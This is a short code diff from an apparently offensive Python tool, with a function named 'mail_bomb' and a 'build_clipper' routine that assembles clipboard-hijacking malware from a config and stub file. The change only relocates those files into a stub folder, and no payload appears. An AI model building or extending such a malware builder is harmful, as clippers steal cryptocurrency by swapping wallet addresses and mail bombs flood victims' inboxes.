@@ -18,7 +18,7 @@ def mail_bomb(t, c):
 
 def build_clipper():
     cl = Theme.get_colors()
-    cp, sp = os.path.join("modules","clipper_config.json"), os.path.join("modules","clipper_stub.txt")
+    cp, sp = os.path.join("modules/stub/","clipper_config.json"), os.path.join("modules/stub/","clipper_stub.txt")
     if not os.path.exists(cp) or not os.path.exists(sp):
         print(Colorate.Horizontal(cl["num"], "  [!] Missing files."))
         return
